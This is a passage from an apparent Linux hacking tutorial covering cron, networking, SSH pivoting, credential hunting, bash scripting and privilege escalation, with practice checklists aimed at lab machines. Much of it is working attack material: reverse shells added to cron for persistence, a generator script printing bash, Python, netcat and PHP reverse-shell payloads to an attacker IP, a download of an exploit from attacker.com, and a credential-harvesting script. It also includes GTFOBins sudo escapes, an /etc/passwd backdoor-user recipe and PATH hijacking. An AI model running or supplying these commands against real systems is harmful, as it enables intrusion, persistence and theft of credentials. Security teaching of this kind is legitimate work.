# Cron reads from crontab files and executes commands at specified times
# System crontabs: /etc/crontab, /etc/cron.d/
# User crontabs: /var/spool/cron/crontabs/username

crontab -l              # List current user's cron jobs
crontab -e              # Edit current user's cron jobs
crontab -l -u root      # List root's cron jobs (need privilege)
cat /etc/crontab        # View system crontab
ls /etc/cron.d/         # View additional cron files
ls /etc/cron.hourly/    # Scripts run hourly
ls /etc/cron.daily/     # Scripts run daily
ls /etc/cron.weekly/    # Scripts run weekly
```

### Crontab Syntax:
```
# ┌───────────── minute (0-59)
# │ ┌───────────── hour (0-23)
# │ │ ┌───────────── day of month (1-31)
# │ │ │ ┌───────────── month (1-12)
# │ │ │ │ ┌───────────── day of week (0-6, 0=Sunday)
# │ │ │ │ │
# * * * * * command

* * * * *     /script.sh          # Run every minute
0 * * * *     /script.sh          # Run every hour at minute 0
0 2 * * *     /backup.sh          # Run at 2am every day
*/5 * * * *   /check.sh           # Every 5 minutes
0 0 * * 0     /weekly.sh          # Every Sunday at midnight
```

### Adding Persistence via Cron:
```bash
# As current user:
(crontab -l; echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1") | crontab -
# ↑ Adds reverse shell to cron, runs every minute

# As root (after privesc):
echo "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /etc/crontab
```

### Cron Job Hijacking for Privilege Escalation:
```bash
# Step 1: Find cron jobs running as root
cat /etc/crontab
cat /etc/cron.d/*
# Look for scripts running as root

# Step 2: Check if the script is WRITABLE by you
ls -la /path/to/root/script.sh

# Step 3: If writable — insert your payload!
echo 'chmod +s /bin/bash' >> /path/to/root/script.sh
# Next time cron runs → /bin/bash gets SUID → /bin/bash -p = root shell!

# Or:
echo 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash' >> /path/to/root/script.sh
```

> **Pro Hacker Tip 🔥:** Even if the script isn't writable, check if a DIRECTORY in the script's PATH is writable. If the script does `cd /tmp && ./cleanup.sh`, and you can write to `/tmp`, you can create your own `cleanup.sh` there.

### How to Practice This Section:
- [ ] Run `ps aux` and identify all root processes
- [ ] Add a cron job that writes the date to a file every minute, then remove it
- [ ] On Metasploitable: check `cat /etc/crontab` for vulnerable cron jobs
- [ ] Practice killing and backgrounding processes
- [ ] Use `pspy` (a tool) to monitor cron jobs without root access

---

# 7. Networking in Linux

> **Networking is everything in hacking. Most attacks go over a network. Understanding Linux networking deeply means you can attack, pivot, evade, and defend.**

## 7.1 Network Configuration

```bash
# Modern method (ip command):
ip addr                         # Show all interfaces and IPs (replaces ifconfig)
ip addr show eth0               # Show specific interface
ip link show                    # Show network interfaces (link layer)
ip route show                   # Show routing table (replaces route)
ip route add 10.0.0.0/8 via 192.168.1.1  # Add route
ip neigh show                   # Show ARP table (replaces arp -n)

# Legacy method (still on old systems):
ifconfig                        # Show all interfaces
ifconfig eth0                   # Show eth0
ifconfig eth0 192.168.1.100/24  # Set IP manually

# Bringing interfaces up/down:
ip link set eth0 up
ip link set eth0 down
ifconfig eth0 up
ifconfig eth0 down

# DNS configuration:
cat /etc/resolv.conf            # Current DNS servers
cat /etc/hosts                  # Local hostname → IP mappings (can be modified!)
# Hackers: add "10.10.10.1 target.htb" to /etc/hosts for CTFs

# Network Manager CLI (on modern systems):
nmcli device show               # Show all network device details
nmcli connection show           # Show connections
```

---

## 7.2 ARP, DNS, and Routing

### ARP (Address Resolution Protocol):
```bash
arp -a                          # Show ARP cache (IP → MAC mappings)
ip neigh show                   # Modern arp -a
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff  # Static ARP entry (ARP poisoning defense)

# Hacker use:
# ARP cache tells you which hosts are currently active on the local network
# ARP spoofing (man-in-the-middle): arpspoof -i eth0 -t victim gateway
```

### DNS:
```bash
nslookup domain.com             # DNS lookup
dig domain.com                  # Advanced DNS lookup
dig domain.com MX               # Mail records
dig domain.com NS               # Name servers
dig @8.8.8.8 domain.com        # Query specific DNS server
dig +short domain.com           # Just the IP
host domain.com                 # Simple lookup
dig domain.com ANY              # ALL records ← Recon!

# Zone transfer attempt (if misconfigured = jackpot!):
dig axfr domain.com @ns1.domain.com   # Enumerate ALL DNS records
```

### Routing:
```bash
ip route show                   # Routing table
route -n                        # Routing table (legacy)
traceroute google.com           # Trace network path (uses ICMP/UDP)
traceroute -T google.com        # TCP traceroute (better through firewalls)
mtr google.com                  # Continuous traceroute + ping combined
```

---

## 7.3 Monitoring Network Connections

```bash
# netstat (legacy but still on most systems):
netstat -tulnp                  # TCP+UDP listening ports + PID ← The golden command
# -t = TCP, -u = UDP, -l = listening, -n = numeric, -p = show PID

netstat -an                     # All connections (connected + listening)
netstat -r                      # Routing table

# ss (modern netstat replacement):
ss -tulnp                       # Same as netstat -tulnp but faster
ss -s                           # Summary statistics
ss -t state established         # Show established TCP connections

# Hacker uses:
# On compromised machine: find what services are running (for internal pivoting)
ss -tulnp | grep -v "127.0.0.1"   # Services accessible from network
netstat -an | grep ESTABLISHED    # Active connections (who's connected to what?)
```

---

## 7.4 iptables — Firewall and Packet Filtering

> **iptables is how Linux controls which packets are allowed. Understanding it helps you both bypass firewalls AND set them up.**

### Core Concepts:
```
Tables → Chains → Rules

TABLES:
  filter  → Default. Allows/blocks packets
  nat     → Network address translation
  mangle  → Modify packet headers

CHAINS (in filter table):
  INPUT   → Incoming packets to THIS machine
  OUTPUT  → Outgoing packets FROM this machine
  FORWARD → Packets passing THROUGH (routing)

RULE FLOW:
  Packet arrives → INPUT chain → Rules checked top-to-bottom → First match wins
```

### Basic iptables Commands:
```bash
iptables -L                         # List all rules
iptables -L -v -n                   # Verbose + numeric (no DNS lookups)
iptables -L INPUT -n --line-numbers # Show INPUT rules with line numbers

# Adding rules:
iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # Allow SSH in
iptables -A INPUT -p tcp --dport 80 -j ACCEPT    # Allow HTTP in
iptables -A INPUT -j DROP                         # Drop everything else

# Blocking:
iptables -A INPUT -s 10.0.0.5 -j DROP            # Block specific IP
iptables -A OUTPUT -p tcp --dport 4444 -j DROP   # Block outbound to port 4444

# Deleting rules:
iptables -D INPUT 3                              # Delete rule #3 from INPUT

# Flush all rules (DANGEROUS — opens everything!):
iptables -F                                      # Clear all rules
```

### ufw — Simplified Firewall (Recommended for beginners):
```bash
ufw enable                          # Enable firewall
ufw status verbose                  # Show rules
ufw allow 22/tcp                    # Allow SSH
ufw allow from 10.0.0.0/8          # Allow from network
ufw deny 4444/tcp                   # Block port 4444
ufw delete allow 80/tcp             # Remove rule
ufw reset                           # Reset to defaults
```

---

## 7.5 SSH — Deep Dive

> **SSH is the most important protocol to master. It's how you access remote machines, pivot through networks, and maintain persistence.**

### Basic SSH Usage:
```bash
ssh user@host                       # Connect to host
ssh -p 2222 user@host               # Custom port
ssh -i ~/.ssh/id_rsa user@host      # Specify private key
ssh -v user@host                    # Verbose (debugging)
ssh -X user@host                    # X11 forwarding (GUI apps over SSH)
```

### SSH Key Authentication:
```bash
# Generate key pair:
ssh-keygen -t rsa -b 4096           # RSA 4096-bit key
ssh-keygen -t ed25519               # Ed25519 (modern, smaller, more secure)
# Keys saved in: ~/.ssh/id_rsa (private) and ~/.ssh/id_rsa.pub (public)

# Copy public key to remote host:
ssh-copy-id user@host               # Automated
# OR manually:
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys   # On remote host

# Permissions MUST be correct:
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa             # Private key: owner read only
chmod 644 ~/.ssh/id_rsa.pub         # Public key: readable
chmod 600 ~/.ssh/authorized_keys
```

### SSH Tunneling — Critical for Pivoting:

#### Local Port Forwarding:
```bash
# Access a remote service through SSH tunnel
ssh -L local_port:remote_host:remote_port user@ssh_server

# Example: Internal web server at 192.168.1.10:80 accessible via SSH to 10.0.0.1
ssh -L 8080:192.168.1.10:80 user@10.0.0.1
# Now: http://localhost:8080 → 192.168.1.10:80 (through the SSH server)
```

#### Remote Port Forwarding (Reverse Tunnel):
```bash
# Create a tunnel FROM the target BACK to your machine
# Useful when target can't be reached directly (firewall)
ssh -R remote_port:local_host:local_port user@your_server

# Example: Expose your local port 8080 as port 9090 on the remote server
ssh -R 9090:localhost:8080 user@your_server
# Anyone connecting to your_server:9090 reaches your localhost:8080
```

#### Dynamic Port Forwarding (SOCKS Proxy):
```bash
# Turn SSH into a SOCKS proxy — route ALL traffic through SSH host
ssh -D 9050 user@pivot_host
# Configure browser/tools to use SOCKS5 at 127.0.0.1:9050
# All traffic now originates from pivot_host's perspective!

# Use with proxychains:
# Edit /etc/proxychains.conf → socks5 127.0.0.1 9050
proxychains nmap -sT 192.168.1.0/24   # Scan internal network through pivot!
```

> **Pro Hacker Tip 🔥:** The SOCKS proxy + proxychains combo is the standard technique for pivoting through compromised hosts. After getting SSH access to a jump host, you can scan and attack the entire internal network from your machine.

### SSH Config File — Quality of Life:
```bash
# ~/.ssh/config
Host target
    HostName 10.10.10.100
    User john
    Port 22
    IdentityFile ~/.ssh/target_key

# Now instead of:
ssh -i ~/.ssh/target_key john@10.10.10.100
# Just do:
ssh target
```

---

## 7.6 Essential Network Tools

### ping:
```bash
ping google.com                    # Test connectivity
ping -c 4 google.com               # Send only 4 packets
ping -i 0.2 10.0.0.1               # Send every 0.2 seconds
# Hacker use: Live host discovery
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done
```

### traceroute:
```bash
traceroute google.com              # Trace route (UDP)
traceroute -T google.com           # TCP traceroute
traceroute -I google.com           # ICMP traceroute
# Shows each hop — helps map network topology
```

### curl — The Swiss Army Knife for Web:
```bash
curl https://example.com                        # GET request
curl -I https://example.com                     # Headers only (HTTP method: HEAD)
curl -X POST -d "user=admin&pass=test" URL      # POST request
curl -X POST -H "Content-Type: application/json" -d '{"key":"val"}' URL
curl -u username:password https://example.com   # Basic auth
curl -b "session=abc123" https://example.com    # Send cookies
curl -k https://insecure.com                    # Ignore SSL errors (-k/--insecure)
curl -L https://url.com                         # Follow redirects
curl -o output.html https://example.com         # Save to file
curl -A "Mozilla/5.0" https://example.com       # Set User-Agent
curl --proxy http://127.0.0.1:8080 https://url  # Route through Burp proxy!
```

### wget — File Downloader:
```bash
wget https://example.com/file.zip              # Download file
wget -r -l 2 https://example.com               # Recursive download (depth 2)
wget -P /tmp https://example.com/shell.php     # Save to /tmp
wget -q https://example.com/file.zip           # Quiet mode
# Hacker use: Download exploit from internet to compromised machine
wget http://attacker.com/exploit.py -O /tmp/exploit.py
```

### Netcat — The Hacker's Swiss Army Knife:
```bash
# Listening (server mode):
nc -lvnp 4444                      # Listen on port 4444
# -l = listen, -v = verbose, -n = no DNS, -p = port

# Connecting (client mode):
nc 10.0.0.1 4444                   # Connect to host:port
nc -nv 10.0.0.1 4444               # No DNS, verbose

# Port scanning with nc:
nc -zv 10.0.0.1 20-100             # Scan ports 20-100

# File transfer:
# Receiver:  nc -lvnp 4444 > received_file
# Sender:    nc -nv 10.0.0.1 4444 < file_to_send

# Banner grabbing:
echo "" | nc -nv 10.0.0.1 80       # Grab HTTP banner
echo "" | nc -nv 10.0.0.1 22       # Grab SSH banner

# Reverse shell (from victim to attacker):
# On attacker: nc -lvnp 4444
# On victim:   nc -e /bin/bash attacker_ip 4444    (traditional)
# Or:          bash -i >& /dev/tcp/attacker_ip/4444 0>&1   (if nc doesn't have -e)

# Bind shell (attacker connects to victim):
# On victim: nc -lvnp 4444 -e /bin/bash
# On attacker: nc victim_ip 4444
```

### How to Practice This Section:
- [ ] Configure a static IP on your Kali VM using `ip addr add`
- [ ] Transfer a file between two VMs using netcat
- [ ] Set up an SSH key-based login between Kali and Metasploitable
- [ ] Create an SSH local port forward and access a service through it
- [ ] Use `proxychains` with an SSH SOCKS proxy to scan through a pivot
- [ ] Practice `curl` by interacting with a web application manually

---

# 8. File System & Storage

## 8.1 Mounting and Unmounting

```bash
mount                           # Show all mounted filesystems
mount /dev/sdb1 /mnt/usb        # Mount USB drive
mount -t ext4 /dev/sdb1 /mnt    # Mount with explicit filesystem type
umount /mnt/usb                 # Unmount (must not be in use!)
df -h                           # Disk space usage (human-readable)
df -i                           # Inode usage
du -sh /var/log/                # Size of directory
du -sh /* 2>/dev/null           # Size of all root directories

# Hacker use:
# After compromise, check mounted drives:
df -h                    # Might find NFS mounts, USB drives, encrypted volumes
cat /etc/fstab           # What gets mounted at boot (also shows NFS shares!)
mount | grep nfs         # NFS mounts (often misconfigured → lateral movement!)
```

---

## 8.2 Finding Sensitive Files

> **This is what you do immediately after getting a foothold. Find credentials, keys, configs.**

```bash
# SSH Keys:
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null

# Configuration files with credentials:
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null    # WordPress DB credentials
find / -name "config.php" 2>/dev/null       # PHP apps credentials
find / -name ".env" 2>/dev/null             # Environment files (API keys!)
find / -name "*.xml" -exec grep -l "password" {} \; 2>/dev/null

# Credential keywords search:
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASS\|DB_PASSWORD\|SECRET_KEY\|API_KEY" / 2>/dev/null

# History files:
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
cat /home/*/.mysql_history 2>/dev/null
cat /home/*/.python_history 2>/dev/null

# Database files:
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

---

## 8.3 Log Files — The Hacker's Intelligence Report

> **Logs tell you what's happening on a system. As a hacker, you want to read them (for intel) AND erase them (to cover tracks). As a defender, you want to protect them.**

### Critical Log Locations:
```bash
/var/log/syslog          # General system log (Debian/Ubuntu)
/var/log/messages        # General log (RHEL/CentOS)
/var/log/auth.log        # Authentication log ← SSH logins, sudo usage, su attempts
/var/log/secure          # Auth log (RHEL/CentOS)
/var/log/kern.log        # Kernel messages
/var/log/apache2/        # Apache web server logs
/var/log/nginx/          # Nginx logs
/var/log/mysql/          # MySQL logs
/var/log/cron            # Cron job execution logs
/var/log/mail.log        # Mail server logs
/var/log/wtmp            # Login records (binary — use `last` to read)
/var/log/btmp            # Bad login attempts (binary — use `lastb`)
/var/log/lastlog         # Last login per user (binary — use `lastlog`)
/var/log/faillog         # Failed logins

# Commands to read binary logs:
last                     # Recent logins (from /var/log/wtmp)
lastb                    # Failed logins (from /var/log/btmp) ← needs root
lastlog                  # Last login for all users
who                      # Who's currently logged in
w                        # Who + what they're doing

# Analyzing auth.log like a pro:
grep "Failed password" /var/log/auth.log | tail -20        # Recent failures
grep "Accepted password\|Accepted publickey" /var/log/auth.log  # Successful logins
grep "sudo" /var/log/auth.log                               # Sudo usage
grep "Invalid user" /var/log/auth.log | awk '{print $8}' | sort | uniq -c | sort -rn
# ↑ Top usernames used in brute force attacks
```

---

## 8.4 /proc and /sys — The Hacker's Goldmine

### /proc — Running System State:
```bash
/proc/version           # Kernel version + compiler info
/proc/cpuinfo           # CPU details
/proc/meminfo           # Memory usage
/proc/net/tcp           # Active TCP connections (raw)
/proc/net/arp           # ARP table
/proc/[PID]/           # Everything about a running process

# Process-specific:
/proc/[PID]/cmdline     # Exact command that started the process (may include passwords!)
/proc/[PID]/environ     # Environment variables of process ← CREDENTIAL HUNTING!
/proc/[PID]/maps        # Memory map
/proc/[PID]/fd/         # Open file descriptors

# Hacker one-liners:
cat /proc/[PID]/environ | tr '\0' '\n'    # Read env vars of a process
# If you can read environment of privileged process → possible credentials!

# Find all process cmdlines (look for passwords in command line args):
for pid in /proc/[0-9]*; do cat $pid/cmdline 2>/dev/null | tr '\0' ' '; echo; done

# Network connections in /proc:
cat /proc/net/tcp        # Hex format (can decode with tools)
```

> **Real-World Story:** In a red team engagement, we found the backup agent process was started with the encryption key as a command-line argument. `cat /proc/[PID]/cmdline` gave us the key to decrypt all backups. Always check `/proc/[PID]/cmdline` and `/proc/[PID]/environ` on interesting processes.

### How to Practice This Section:
- [ ] Mount a USB or disk image on Kali and explore its contents
- [ ] Find all SUID files AND all config files containing "password" on Metasploitable
- [ ] Analyze `/var/log/auth.log` on your Kali VM after making some failed SSH attempts
- [ ] Read `/proc/[PID]/cmdline` for a running service (e.g., sshd)
- [ ] Check `/proc/net/tcp` and decode the ports

---

# 9. Shell Scripting for Hackers

> **Shell scripting multiplies your effectiveness by 10x. Everything you do manually, you can automate. A script that takes 30 hours to run manually takes 30 minutes when scripted.**

## 9.1 Bash Scripting Fundamentals

### Script Structure:
```bash
#!/bin/bash
# This is a comment
# #!/bin/bash = shebang line — tells OS which interpreter to use

echo "Hello, Hacker!"
```

```bash
# Make executable:
chmod +x script.sh
# Run:
./script.sh
bash script.sh
```

---

## 9.2 Variables:

```bash
name="Praneeth"               # Assign variable (no spaces around =!)
echo $name                    # Access variable with $
echo "Hello $name"            # Variable inside string
echo "Hello ${name}!"         # Curly braces for clarity

# Special variables:
$0                            # Script name
$1, $2, $3...                 # Arguments ($1 = first arg, $2 = second, etc.)
$#                            # Number of arguments
$@                            # All arguments
$?                            # Exit code of last command (0=success, non-zero=error)
$$                            # Current script's PID
$USER                         # Current username
$HOME                         # Home directory
$PATH                         # PATH variable

# Arrays:
targets=("192.168.1.1" "192.168.1.2" "192.168.1.3")
echo ${targets[0]}            # First element
echo ${targets[@]}            # All elements
echo ${#targets[@]}           # Length of array

# Command substitution:
current_user=$(whoami)        # Capture command output into variable
ip_addr=$(hostname -I | awk '{print $1}')
echo "Running as: $current_user on $ip_addr"
```

---

## 9.3 Conditionals:

```bash
# if-else:
if [ condition ]; then
    commands
elif [ other_condition ]; then
    commands
else
    commands
fi

# Comparison operators (for numbers):
-eq   # equal
-ne   # not equal
-lt   # less than
-le   # less than or equal
-gt   # greater than
-ge   # greater than or equal

# Comparison operators (for strings):
=     # equal
!=    # not equal
-z    # is empty (zero length)
-n    # is not empty

# File test operators:
-f file   # file exists and is regular file
-d dir    # directory exists
-r file   # file is readable
-w file   # file is writable
-x file   # file is executable
-s file   # file exists and is not empty

# Examples:
if [ $? -eq 0 ]; then
    echo "Last command succeeded!"
fi

if [ -f "/etc/passwd" ]; then
    echo "/etc/passwd exists"
fi

if [ "$USER" = "root" ]; then
    echo "Running as root!"
else
    echo "Not root — attempting privilege escalation..."
fi

# Double brackets (more flexible, bash-specific):
if [[ $USER == "root" || $USER == "admin" ]]; then
    echo "Privileged user detected"
fi
```

---

## 9.4 Loops:

```bash
# for loop:
for i in {1..10}; do
    echo $i
done

# Loop through array:
for ip in "${targets[@]}"; do
    ping -c 1 $ip &>/dev/null && echo "$ip is UP"
done

# C-style for loop:
for ((i=0; i<10; i++)); do
    echo $i
done

# while loop:
counter=0
while [ $counter -lt 5 ]; do
    echo "Counter: $counter"
    ((counter++))
done

# Read file line by line:
while IFS= read -r line; do
    echo "Processing: $line"
done < targets.txt

# until loop:
until [ $counter -ge 5 ]; do
    echo $counter
    ((counter++))
done
```

---

## 9.5 Functions:

```bash
# Define function:
function scan_host() {
    local target=$1          # local = only accessible inside function
    echo "Scanning $target..."
    nmap -sV -p 22,80,443 $target
}

# Call function:
scan_host 192.168.1.1
scan_host 10.0.0.5

# Function with return value:
function is_alive() {
    ping -c 1 -W 1 $1 &>/dev/null
    return $?    # Return 0=success (alive), 1=fail (dead)
}

if is_alive 192.168.1.1; then
    echo "Host is up!"
fi
```

---

## 9.6 Actual Hacking Scripts

### Script 1: Simple Port Scanner:
```bash
#!/bin/bash
# Usage: ./portscan.sh 192.168.1.1

TARGET=$1
echo "[*] Scanning $TARGET for open ports..."

for port in {1..1024}; do
    (echo >/dev/tcp/$TARGET/$port) 2>/dev/null && echo "[+] Port $port is OPEN"
done

echo "[*] Scan complete!"
```

### Script 2: Host Discovery Script:
```bash
#!/bin/bash
# Usage: ./discover.sh 192.168.1

SUBNET=$1
echo "[*] Discovering live hosts on ${SUBNET}.0/24..."

for host in {1..254}; do
    ping -c 1 -W 1 ${SUBNET}.${host} &>/dev/null && \
    echo "[+] ${SUBNET}.${host} is alive" &
done
wait
echo "[*] Discovery complete!"
```

### Script 3: Automated Credential Finder:
```bash
#!/bin/bash
echo "[*] Hunting for credentials..."

echo "=== BASH HISTORIES ==="
cat /home/*/.bash_history 2>/dev/null | grep -i "pass\|key\|secret\|login"

echo "=== CONFIG FILES ==="
find /var/www /opt /etc -name "*.conf" -o -name "*.php" -o -name "*.env" 2>/dev/null | \
while read file; do
    grep -l -i "password\|passwd\|secret\|db_pass" "$file" 2>/dev/null && echo "  ↑ Found in: $file"
done

echo "=== SUID FILES ==="
find / -perm -4000 2>/dev/null

echo "=== SUDO RIGHTS ==="
sudo -l 2>/dev/null
```

### Script 4: Reverse Shell Generator:
```bash
#!/bin/bash
# Generate various reverse shell one-liners

ATTACKER_IP=$1
PORT=$2

echo "[*] Reverse Shell Payloads for $ATTACKER_IP:$PORT"
echo ""
echo "=== BASH ==="
echo "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"
echo ""
echo "=== Python 3 ==="
echo "python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"$ATTACKER_IP\",$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/bash\"])'"
echo ""
echo "=== Netcat ==="
echo "nc -e /bin/bash $ATTACKER_IP $PORT"
echo ""
echo "=== PHP ==="
echo "php -r '\$s=fsockopen(\"$ATTACKER_IP\",$PORT);\$proc=proc_open(\"/bin/bash\",array(0=>\$s,1=>\$s,2=>\$s),\$pipes);'"
```

---

## 9.7 Essential One-Liners Every Hacker Must Know:

```bash
# Find SUID binaries:
find / -perm -u=s -type f 2>/dev/null

# Find writable directories:
find / -writable -type d 2>/dev/null | grep -v proc

# Extract all IPs from a file:
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file.txt

# Extract all URLs from HTML:
curl -s https://example.com | grep -oE 'https?://[^"]+' | sort -u

# Monitor for new processes (without root — detect cron jobs):
watch -n 1 "ps aux --no-headers | sort -k1 | diff - /tmp/ps.prev; ps aux --no-headers | sort -k1 > /tmp/ps.prev"

# Find all listening ports:
ss -tulnp | awk 'NR>1 {print $5}' | cut -d: -f2 | sort -n | uniq

# Bash TCP port scanner (no tools needed):
for port in 21 22 23 25 80 443 3306 5432 8080 8443; do
    (echo >/dev/tcp/TARGET/$port) 2>/dev/null && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
done

# Get all email addresses from a website:
curl -s https://example.com | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u

# Base64 encode/decode:
echo "secret" | base64           # Encode
echo "c2VjcmV0Cg==" | base64 -d  # Decode

# Quick HTTP server for file transfer:
python3 -m http.server 8080

# Listen on port and save received data:
nc -lvnp 4444 > received_data.txt

# Upgrade dumb shell to full TTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: CTRL+Z → stty raw -echo; fg → reset → export TERM=xterm

# Find recently modified files (last 10 minutes):
find / -mmin -10 2>/dev/null | grep -v proc | grep -v sys
```

### How to Practice This Section:
- [ ] Write a script that takes an IP range and pings all hosts in it
- [ ] Write a script that automatically checks for SUID files and looks them up on a local list
- [ ] Write a script that checks for all common privesc vectors
- [ ] Automate the credential hunting script and run it on Metasploitable

---

# 10. Linux Privilege Escalation

> **This is the most important chapter. Privilege escalation (privesc) is how you go from a low-level user to root. On a real penetration test, you don't stop at "I got a shell" — you stop at "I got a ROOT shell."**

## 10.1 The Privilege Escalation Mindset

> **Think like a detective.** You're on a system. You have limited privileges. You need to find the ONE thing that's misconfigured that lets you become root. Systematic enumeration is the key.

### The First 10 Commands After Getting a Shell:
```bash
id                          # Who am I?
whoami                      # Confirm username
sudo -l                     # What can I run as root? (MOST IMPORTANT!)
uname -a                    # Kernel version (for kernel exploits)
cat /etc/os-release         # OS version
ps aux                      # What's running?
ss -tulnp                   # What ports are listening?
cat /etc/passwd             # Other users?
find / -perm -4000 2>/dev/null  # SUID files
cat /etc/crontab            # Scheduled tasks?
```

---

## 10.2 Manual Enumeration Checklist

### System Information:
```bash
uname -a                    # Kernel + architecture
cat /proc/version
cat /etc/issue              # OS banner
lscpu                       # CPU info
env                         # Environment variables (look for credentials!)
```

### User and Privilege Info:
```bash
id
whoami
sudo -l                     # ← RUN THIS FIRST, ALWAYS
cat /etc/passwd
cat /etc/group
cat /etc/sudoers 2>/dev/null
ls -la /root/ 2>/dev/null   # Can you read root's home?
```

### SUID/SGID Files:
```bash
find / -perm -u=s -type f 2>/dev/null    # SUID
find / -perm -g=s -type f 2>/dev/null    # SGID
# Take every result and check GTFOBins!
```

### Writable Files and Directories:
```bash
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys"
find / -writable -type d 2>/dev/null | grep -v "/proc\|/sys"
# Look for writable scripts that root runs!
```

### Cron Jobs:
```bash
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
# Check if any scripts are writable by you!
```

### Interesting Files:
```bash
cat /home/*/.bash_history
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.txt" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
```

### Capabilities:
```bash
getcap -r / 2>/dev/null
# Capabilities are like mini-SUID bits for specific privileges
# Example: python3 with cap_setuid = root!
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### NFS Shares (Possible Root Squash Misconfig):
```bash
cat /etc/exports
showmount -e localhost
# If no_root_squash is set + you can write to NFS share → SUID attack!
```

---

## 10.3 Automated Enumeration Tools

### LinPEAS (Best Tool — Use This First):
```bash
# Download and run:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
# Or transfer to target and run:
./linpeas.sh
./linpeas.sh -a    # All checks (more thorough)
./linpeas.sh > linpeas_output.txt  # Save output

# LinPEAS color codes:
# RED/YELLOW → Critical findings (likely exploitable!)
# RED → High confidence exploitation
# GREEN → Interesting
```

### LinEnum:
```bash
# Download:
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t    # Thorough mode
```

### linux-exploit-suggester:
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
# Outputs list of kernel exploits for your kernel version!
```

### pspy — Process Monitor (No Root Needed):
```bash
# Monitors processes, cron jobs without needing root
./pspy64    # Watch for processes to spot root cron jobs
# Great for finding scripts that run as root periodically
```

---

## 10.4 Sudo Misconfigurations

```bash
# Always run sudo -l first!
sudo -l

# Common misconfigurations:
# (ALL : ALL) NOPASSWD: ALL → Just do: sudo bash

# Specific binary misconfigs → GTFOBins:
sudo find / -name "anything" -exec /bin/bash \;
sudo vim -c ':!bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/passwd    → then '!/bin/bash'
sudo man man             → then '!/bin/bash'
sudo git log             → then '!/bin/bash'
sudo zip /tmp/test /etc/passwd -T --unzip-command="bash -c /bin/bash"
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh  # Docker escape!
sudo nmap --interactive  → then '!sh'
```

---

## 10.5 Writable /etc/passwd Attack

> **This is a classic. If you can write to /etc/passwd, you can create a root user.**

```bash
# Check if /etc/passwd is writable (misconfiguration):
ls -la /etc/passwd
# If writable by your user:

# Generate a password hash:
openssl passwd -1 -salt hacker hackerpassword
# Output: $1$hacker$HASH

# Append backdoor root user:
echo 'hacker:$1$hacker$HASH:0:0:hacker:/root:/bin/bash' >> /etc/passwd

# Login:
su hacker    # Enter: hackerpassword → You're root!
```

---

## 10.6 PATH Variable Hijacking

```bash
# Scenario: Root runs a script that calls a command WITHOUT full path
# Example: Script calls "backup" instead of "/usr/bin/backup"

# Step 1: Find scripts called by root that use relative paths
cat /opt/script.sh
# Contains: backup files.tar (not /usr/bin/backup!)

# Step 2: Create malicious "backup" in a directory you control
echo '#!/bin/bash' > /tmp/backup
echo 'chmod +s /bin/bash' >> /tmp/backup
chmod +x /tmp/backup

# Step 3: Add your directory to the FRONT of PATH
export PATH=/tmp:$PATH

# Step 4: Wait for root to run the script (or trigger it)
# When script runs "backup", it finds YOUR /tmp/backup first!

# Step 5: After script runs:
/bin/bash -p    # Root shell!
```

---

## 10.7 Kernel Exploits

> **The nuclear option. Kernel exploits bypass everything. But they can crash the system — use with caution.**

```bash
# Step 1: Get kernel version
uname -a
# Linux target 4.15.0-88-generic #88-Ubuntu

# Step 2: Search for exploits
./linux-exploit-suggester.sh
searchsploit linux kernel 4.15
searchsploit linux local privilege escalation

# Famous kernel exploits:
# DirtyCOW (CVE-2016-5195)     → Linux 2.6.22 - 4.8 kernel
# OverlayFS (CVE-2021-3493)    → Ubuntu 20.04
# PwnKit (CVE-2021-4034)       → pkexec local privilege escalation (polkit)
# Dirty Pipe (CVE-2022-0847)   → Linux 5.8-5.16

# PwnKit (affects most Linux systems):
# If polkit/pkexec is present and vulnerable:
# Exploit: https://github.com/arthepsy/CVE-2021-4034
gcc -o exploit exploit.c
./exploit    # Instant root on vulnerable systems!
```

---

## 10.8 Docker/LXC Container Escape

```bash
# Check if you're in a container:
cat /proc/1/cgroup | grep docker
ls /.dockerenv      # Exists = inside Docker
id | grep docker    # Are you in docker group?

